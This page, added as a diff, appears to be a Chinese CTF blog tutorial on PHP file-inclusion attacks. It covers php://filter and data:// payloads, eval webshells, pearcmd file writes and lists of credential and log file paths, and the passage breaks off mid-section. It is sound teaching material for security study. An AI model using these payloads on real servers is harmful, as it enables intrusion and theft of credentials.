@@ -1,0 +1,359 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>文件包含 | micgo's blog</title><meta name="keywords" content="文件包含"><meta name="author" content="micgo"><meta name="copyright" content="micgo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="PHP带有很多内置URL风格的封装协议,可用于类似fopen()、copy()、file_exists() 和 filesize()的文件系统函数。当遇到文件包含时,我们可以这个特性来完成我们需要的指令。 常见文件包含函数include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含">
+<meta property="og:url" content="https://micgo.top/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="micgo&#39;s blog">
+<meta property="og:description" content="PHP带有很多内置URL风格的封装协议,可用于类似fopen()、copy()、file_exists() 和 filesize()的文件系统函数。当遇到文件包含时,我们可以这个特性来完成我们需要的指令。 常见文件包含函数include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg">
+<meta property="article:published_time" content="2022-04-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-16T04:05:52.355Z">
+<meta property="article:author" content="micgo">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg"><link rel="shortcut icon" href="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg"><link rel="canonical" href="https://micgo.top/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '文件包含',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-16 12:05:52'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="micgo's blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">micgo's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">文件包含</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-24T16:00:00.000Z" title="发表于 2022-04-25 00:00:00">2022-04-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-16T04:05:52.355Z" title="更新于 2023-03-16 12:05:52">2023-03-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="文件包含"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>PHP带有很多内置URL风格的封装协议,可用于类似fopen()、copy()、file_exists() 和 filesize()的文件系统函数。当遇到文件包含时,我们可以这个特性来完成我们需要的指令。</p>
+<h4 id="常见文件包含函数"><a href="#常见文件包含函数" class="headerlink" title="常见文件包含函数"></a>常见文件包含函数</h4><p>include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">include</span><br><span class="line">include_once：遇到重复文件，只包含一次</span><br><span class="line">require</span><br><span class="line">require_once: 遇到重复文件，只包含一次</span><br><span class="line">highlight_file、show_source、readfile、file_get_contents、fopen、file (读取文件)</span><br><span class="line"></span><br><span class="line">include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。</span><br><span class="line"></span><br><span class="line">而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmd1|cmd2:不论cmd1是否为真，cmd2都会被执行；</span><br><span class="line">cmd1;cmd2：不论cmd1是否为真，cmd2都会被执行；</span><br><span class="line">cmd1||cmd2：如果cmd1为假，则执行cmd2；</span><br><span class="line">cmd1&amp;&amp;cmd2：如果cmd1为真，则执行cmd2；</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="文件包含漏洞分类"><a href="#文件包含漏洞分类" class="headerlink" title="文件包含漏洞分类"></a>文件包含漏洞分类</h4><ol>
+<li>本地文件包含</li>
+<li>远程文件包含</li>
+</ol>
+<p>两个配置文件<br>allow_url_fopen：为ON时，能读取远程文件，例如file_get_contents()就能读远程文件<br>allow_url_include：为ON时，就可使用include和require等方式包含远程文件</p>
+<h4 id="常见的敏感信息路径"><a href="#常见的敏感信息路径" class="headerlink" title="常见的敏感信息路径"></a>常见的敏感信息路径</h4><p>Windows系统</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini 						     #查看系统版本</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml   #IIS配置文件</span><br><span class="line">c:\windows\repair\sam 				      #存储Windows系统初次安装的密码</span><br><span class="line">c:\ProgramFiles\mysql\my.ini 			  #MySQL配置</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD  #MySQL root密码</span><br><span class="line">c:\windows\php.ini                         #php配置信息</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Linux&#x2F;Unix系统</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd # 账户信息</span><br><span class="line">/etc/shadow # 账户密码文件</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf # Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf # 虚拟网站配置</span><br><span class="line">/usr/local/app/php5/lib/php.ini # PHP相关配置</span><br><span class="line">/etc/httpd/conf/httpd.conf # Apache配置文件</span><br><span class="line">/etc/my.conf # mysql 配置文件</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>常见协议</strong></p>
+<p>file:&#x2F;&#x2F; — 访问本地文件系统</p>
+<p>php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</p>
+<p>zlib:&#x2F;&#x2F; — 压缩流</p>
+<p>data:&#x2F;&#x2F; — 数据（RFC 2397）</p>
+<p>phar:&#x2F;&#x2F; — PHP 归档</p>
+<h4 id="常见利用方式"><a href="#常见利用方式" class="headerlink" title="常见利用方式"></a><strong>常见利用方式</strong></h4><h5 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a><strong>php:&#x2F;&#x2F;</strong></h5><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.-encode&#x2F;resource&#x3D;index.php (常用于读取源码)</p>
+<p>php:&#x2F;&#x2F;input  (配合post发送数据)</p>
+<h5 id="谈一谈php-x2F-x2F-filter的妙用"><a href="#谈一谈php-x2F-x2F-filter的妙用" class="headerlink" title="谈一谈php:&#x2F;&#x2F;filter的妙用"></a><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php:&#x2F;&#x2F;filter的妙用</a></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=php://input</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i0.hdslb.com/bfs/album/0c01ae826c0d7766a2b34be6f701e5b30e9601fd.png" alt="img"></p>
+<h6 id="base64绕过死亡-die-x2F-exit"><a href="#base64绕过死亡-die-x2F-exit" class="headerlink" title="base64绕过死亡 die &#x2F; exit"></a>base64绕过死亡 die &#x2F; exit</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的，我们即可使用 php:&#x2F;&#x2F;filter协议来施展魔法：使用php:&#x2F;&#x2F;filter流的base64-decode方法，将 <code>$content</code> 解码，利用 php base64_decode 函数特性去除  “ 死亡exit ”</p>
+<p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
+<p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode 来首先对其解码。在解码的过程中，字符 &lt;  ?  ;  &gt;  空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有 phpexit 和我们传入的其他字符。</p>
+<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p>
+<p>最后效果是 ：</p>
+<p><img src="https://i0.hdslb.com/bfs/album/4f2b1fd75551279202a950879223b9ddf113b8a1.png" alt="img"></p>
+<p>对<code>&lt;?php system(&#39;tac *.php&#39;);?&gt;</code>进行base64编码</p>
+<p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTs&#x2F;Pg&#x3D;&#x3D;<br>但是这里的&#x3D;被过滤</p>
+<p>可以在前面的基础上加一点东西</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;tac *.php&#x27;);?&gt;aa</span><br><span class="line">//base64: PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTs/PmFh</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="字符串操作方法绕过死亡die-x2F-exit"><a href="#字符串操作方法绕过死亡die-x2F-exit" class="headerlink" title="字符串操作方法绕过死亡die&#x2F;exit"></a>字符串操作方法绕过死亡die&#x2F;exit</h6><p>这个<code>&lt;?php exit; ?&gt;</code>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php:&#x2F;&#x2F;filter刚好是支持这个方法的。</p>
+<p>编写如下测试代码即可查看 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.strip_tags&#x2F;resource&#x3D;php:&#x2F;&#x2F;input 的效果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo readfile(&#x27;php://filter/read=string.strip_tags/resource=php://input&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i0.hdslb.com/bfs/album/1e1b22bf37b0c4a4177438ab641852a101c5a142.png" alt="img"></p>
+<p>php:&#x2F;&#x2F;filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。</p>
+<p>“死亡exit”在第一步被去除，而webshell在第二步被还原。</p>
+<p>最终的数据包如下：</p>
+<p><img src="https://i0.hdslb.com/bfs/album/8536923f147b0e59bd85bc5956728f2bf7fa8818.png" alt="img"></p>
+<h6 id="rot13编码绕过死亡die-x2F-exit"><a href="#rot13编码绕过死亡die-x2F-exit" class="headerlink" title="rot13编码绕过死亡die&#x2F;exit"></a><strong>rot13编码绕过死亡die&#x2F;exit</strong></h6><p><code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了：</p>
+<p><img src="https://i0.hdslb.com/bfs/album/3d19b0ffad0c3d8c672de429bb97dcfab807fc49.png" alt="img"></p>
+<h6 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv"></a><strong>convert.iconv</strong></h6><p>这个过滤器需要php支持iconv，而iconv是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。</p>
+<h6 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h6><ol>
+<li>usc-2 两位一反转(字符数量需为偶数)</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=s1mple.ph</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//0b6cbb09-4547-46d7-9710-0154c8e14b60.challenge.ctf.show/?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php</span></span><br><span class="line">contents=?&lt;hp pe@<span class="title function_ invoke__">av</span>(l_<span class="variable">$EG</span>[T]x;)&gt;?</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>usc-4 四位一反转(字符数量需为4的倍数)</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@%20p(lavOP_<span class="variable">$s</span>[TS]pm1&gt;?;)/resource=s1mple.php</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>utf-8与utf-7之间的转化</li>
+</ol>
+<p>纯字符进行utf之间的转换后还是其本身，故可直接混淆死亡代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=s1mple.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a><strong>data:&#x2F;&#x2F;</strong></h5><ul>
+<li><strong>条件</strong>：<ul>
+<li><code>allow_url_fopen</code>:on</li>
+<li><code>allow_url_include</code> :on</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain; , 编码的payload</span><br><span class="line">index.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line">index.php?file=data:text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a><strong>zip:&#x2F;&#x2F;</strong></h5><p>zip:&#x2F;&#x2F; 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。</p>
+<p>zip:&#x2F;&#x2F;中只能传入绝对路径。<br>要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）<br>只需要是zip的压缩包即可，后缀名可以任意更改。<br>相同的类型的还有zlib:&#x2F;&#x2F;和bzip2:&#x2F;&#x2F;<br><img src="https://i0.hdslb.com/bfs/album/7f50178c0c8206ef565ea3fc3685429c47aa3e1f.png" alt="img"></p>
+<h5 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a><strong>file:&#x2F;&#x2F;</strong></h5><p>file:&#x2F;&#x2F;[文件的绝对路径和文件名]</p>
+<p>file:&#x2F;&#x2F;d:&#x2F;flag.txt</p>
+<h5 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a><strong>phar:&#x2F;&#x2F;</strong></h5><p>phar:&#x2F;&#x2F;中相对路径和绝对路径都可以使用</p>
+<p><img src="https://i0.hdslb.com/bfs/album/1c567d0f2f7d126f8f55440ffc8fbeacc93ede87.png" alt="img"></p>
+<p>phar:&#x2F;&#x2F;[压缩文件路径]#[压缩文件内的子文件名]</p>
+<p>例如脚本文件为1.php，打包成1.zip，然后再改名为1.jpg</p>
+<p>index.php?file&#x3D;phar:&#x2F;&#x2F;1.jpg&#x2F;1.php</p>
+<p>或 绝对路径</p>
+<p>index.php?file&#x3D;phar:&#x2F;&#x2F;D:&#x2F;1.jpg&#x2F;1.php</p>
+<h4 id="CTF-PHP代码审计中file-put-contents函数利用"><a href="#CTF-PHP代码审计中file-put-contents函数利用" class="headerlink" title="CTF PHP代码审计中file_put_contents函数利用"></a>CTF PHP代码审计中file_put_contents函数利用</h4><p>通过file_put_contents写入文件<br>难点在于。要写一个webshell。但字符只能a-zA-Z0-9_，而webshell至少需要  <strong>&lt;?</strong></p>
+<p>看file_put_contens的文档即可发现，函数第二个允许传入数组，将被连接为字符串再写入<br>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">content[]=&lt;?php&amp;content[]=%0aphpinfo();</span><br><span class="line">file_put_contens($filename,$content)</span><br></pre></td></tr></table></figure>
+
+<p>此时，$content为&lt;?php phpinfo(); 传入的数组刚好绕过了正则检测<br><img src="https://i0.hdslb.com/bfs/album/84acfc21a4977434ff8a826540bbc2168935b044.png" alt="img"></p>
+<p><strong>最后补一句，其实这个漏洞在fopen(),fwrite(), fclose()也是存在的</strong></p>
+<h4 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h4><p><strong>fuzz日志文件</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/log/apache2/error.log</span><br><span class="line">/var/log/nginx/access.log</span><br><span class="line">/var/log/nginx/access_log</span><br><span class="line">/var/log/nginx/error.log</span><br><span class="line">/var/log/nginx/error_log</span><br><span class="line">/var/log/httpd/access.log</span><br><span class="line">/var/log/httpd/access_log</span><br><span class="line">/var/log/httpd/error.log</span><br><span class="line">/var/log/httpd/error_log</span><br><span class="line">/var/log/access_log</span><br><span class="line">/var/log/access.log</span><br><span class="line">/var/log/error_log</span><br><span class="line">/var/log/error.log</span><br><span class="line">/var/log/apache/access_log</span><br><span class="line">/var/log/apache2/access_log</span><br><span class="line">/var/log/apache/error_log</span><br><span class="line">/var/log/apache2/error_log</span><br><span class="line">/usr/local/apache/log</span><br><span class="line">/usr/local/apache/logs</span><br><span class="line">/usr/local/apache/logs/access.log</span><br><span class="line">/usr/local/apache/logs/access_log</span><br><span class="line">/usr/local/apache/logs/error.log</span><br><span class="line">/usr/local/apache/logs/error_log</span><br><span class="line">/usr/local/apache2/logs/access.log</span><br><span class="line">/usr/local/apache2/logs/access_log</span><br><span class="line">/usr/local/apache2/logs/error.log</span><br><span class="line">/usr/local/apache2/logs/error_log</span><br><span class="line">/etc/httpd/logs/acces.log</span><br><span class="line">/etc/httpd/logs/acces_log</span><br><span class="line">/etc/httpd/logs/access.log</span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/etc/httpd/logs/error.log</span><br><span class="line">/etc/httpd/logs/error_log</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="pearcmd文件包含"><a href="#pearcmd文件包含" class="headerlink" title="pearcmd文件包含"></a>pearcmd文件包含</h4><p><code>register_argc_argv</code>为<code>On</code>，其中php-apache的docker环境默认满足</p>
+<p><strong>方法一：</strong>直接写文件</p>
+<p>注意这里需要在burp中发包</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /?+config-create+/&amp;f=/usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br><span class="line">GET /?+config-create+/&amp;f=/usr/local/lib/php/peclcmd&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure>
+
+<p>再包含写入的文件</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=/tmp/hello</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法二：</strong>拉取远程文件</p>
+<ul>
